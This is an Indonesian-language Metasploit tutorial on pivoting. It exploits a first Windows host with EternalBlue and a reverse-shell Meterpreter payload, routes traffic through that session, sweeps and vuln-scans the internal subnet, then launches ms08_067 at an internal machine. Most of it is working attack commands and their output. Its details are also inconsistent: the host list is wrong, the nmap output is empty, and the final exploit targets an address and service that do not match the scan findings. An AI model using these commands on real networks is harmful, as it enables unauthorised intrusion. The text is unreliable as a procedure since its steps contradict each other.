# Pivoting dan Route Command di Metasploit

## A. Apa Itu Pivoting?

[Pivoting](https://en.wikipedia.org/wiki/Exploit_(computer_security)#Pivoting) adalah teknik menggunakan sistem yang telah dikompromikan sebagai `hot point` untuk menyerang sistem lain di jaringan internal yang hanya bisa diakses dari dalam.

**Ada dua jenis pivoting:**
- Layer 3 pivoting (routing) -> menggunakan `autoroute` dan `route` di Metasploit.
- Layer 2 pivoting (`ARP spoofing`, `bridge`) -> biasanya dilakukan dengan tools seperti [ettercap](https://www.ettercap-project.org/) atau [bettercap](https://www.bettercap.org/).

## B. Syarat Pivoting di Metasploit

- Sudah ada Meterpreter session di host pertama (pivot point).
- Host tersebut punya akses ke jaringan internal yang ingin dijelajahi.
- Modul `autoroute` atau perintah `route` digunakan untuk menambahkan rute jaringan internal.

## C. Langkah-Langkah Melakukan Pivoting di Metasploit

### 1. Dapatkan Akses ke Mesin Pertama

Contoh:

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
```

Hasil output-nya seperti ini:

```
[+] 192.168.1.10:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.10:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.10:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
```

Itu artinya kita sudah mendapatkan akses ke mesin pertama.

### 2. Tambahkan Route Internal dengan `autoroute`

Misalnya, mesin A bisa melihat jaringan internal `192.168.1.0/24`:

```
run autoroute -s 192.168.1.0/24
```

Keterangan:
- `-s`: (subnet) jaringan internal target: `192.168.1.0/24`

Hasil output-nya seperti ini:

```
meterpreter > run autoroute -s 192.168.1.0/24
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.168.1.0/255.255.255.0...
[+] Added route to 192.168.1.0/255.255.255.0 via 192.168.1.45
[*] Use the -p option to list all active routes
```

Atau secara manual:

```
background
route add 192.168.1.0 255.255.255.0 4
```

Keterangan:
- `192.168.1.0`: Alamat IP Network target
- `192.168.1.255`: Alamat IP Broadcast target
- Angka `4`: Sesi ID Meterpreter.

Hasil output-nya seperti ini:

```
meterpreter > background 
[*] Backgrounding session 4...
msf6 auxiliary(scanner/discovery/arp_sweep) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  4         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ ADMIN-PC  192.168.1.42:4444 -> 192.168.1.45:49160 (192.168.1.45)

msf6 auxiliary(scanner/discovery/arp_sweep) > route add 192.168.1.0 255.255.255.0 4
[*] Route added
msf6 auxiliary(scanner/discovery/arp_sweep) > 
```

Cek route yang sudah ada:

```
route print
```

Hasil output-nya seperti ini:

```
msf6 auxiliary(scanner/discovery/arp_sweep) > route print 

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.1.0        255.255.255.0      Session 4

[*] There are currently no IPv6 routes defined.
```


### 3. Gunakan `auxiliary/scanner` Melalui Route

Kamu sekarang bisa melakukan scanning ke internal network.

Contoh scanning semua host yang ada di internal:

```
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.1.0/24
set verbose true
run
```

Ini akan meng-scan semua host yang up/aktif yang ada di jaringan yang sama, mulai dari host dengan alamat IP `192.168.1.1` sampai dengan host dengan alamat IP `192.168.1.254`.

Hasil output-nya seperti ini:

```
msf6 auxiliary(scanner/discovery/arp_sweep) > set rhosts 192.168.1.0/24
rhosts => 192.168.1.0/24
msf6 auxiliary(scanner/discovery/arp_sweep) > set verbose true 
verbose => true
msf6 auxiliary(scanner/discovery/arp_sweep) > run
[+] 192.168.1.1 appears to be up (UNKNOWN).
[+] 192.168.1.4 appears to be up (UNKNOWN).
[+] 192.168.1.7 appears to be up (UNKNOWN).
[+] 192.168.1.12 appears to be up (UNKNOWN).
[+] 192.168.1.45 appears to be up (CADMUS COMPUTER SYSTEMS).
[+] 192.168.1.47 appears to be up (UNKNOWN).
[+] 192.168.1.48 appears to be up (CADMUS COMPUTER SYSTEMS).
[+] 192.168.1.42 appears to be up (ALFA, INC.).
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/discovery/arp_sweep) > 
```

Dari hasil scan tersebut, ditemukan 8 alamat IP Address yakni:
- `192.168.1.1`
- `192.168.1.4`
- `192.168.1.7`
- `192.168.1.12`
- `192.168.1.42`
- `192.168.1.45`
- `192.168.1.47`
- `192.168.1.45`

Buat file `host.txt`:

```
nano host.txt
```

Isi dengan:

```
192.168.1.1
192.168.1.4
192.168.1.7
192.168.1.12
192.168.1.42
192.168.1.47
192.168.1.48
```

Kenapa host dengan alamat IP Address `192.168.1.45` tidak diikutsertakan? karena host tersebut sudah dieksploitasi alias sudah menjadi jembatan pertama untuk mengeksploitasi host-host yang lain.

Scan host-host tersebut menggunakan `Nmap`:

```
nmap -sS -T4 -O --script vuln -iL host.txt
```

Keterangan:
- `-sS`: Menggunakan teknik `SYN` scan (stealth)
- `-T4`: Templat waktu (semakin tinggi semakin cepat)
- `-O`: Mengaktifkan scan OS (sistem operasi)
- `--script vuln`: Jalankan semua skrip kategori vuln (vulnerability detection)
- `-iL`: File yang berisi daftar host yang ingin di-scan: `host.txt`

Hasil output-nya seperti ini:

```

```

Dari hasil scan tersebut, ditemukan vulnerability `vsFTPd version 2.3.4 backdoor` pada host `192.168.1.48`.

### 4. Lanjutkan Eksploitasi ke Mesin Internal

Setelah tahu ada mesin internal dengan service aktif, kamu bisa lanjut menggunakan exploit yang sesuai:

```
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.10.20
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
```

### Tips Tambahan

- Gunakan `arp` di Meterpreter untuk melihat host yang pernah diakses:

   ```
  meterpreter > arp
  ```

- Gunakan netstat untuk lihat koneksi:

  ```
  meterpreter > netstat
  ```

- Bisa chaining pivot lebih dari satu kali (multi-hop), tapi perlu VPN atau SOCKS proxy (contoh: `auxiliary/server/socks_proxy`).
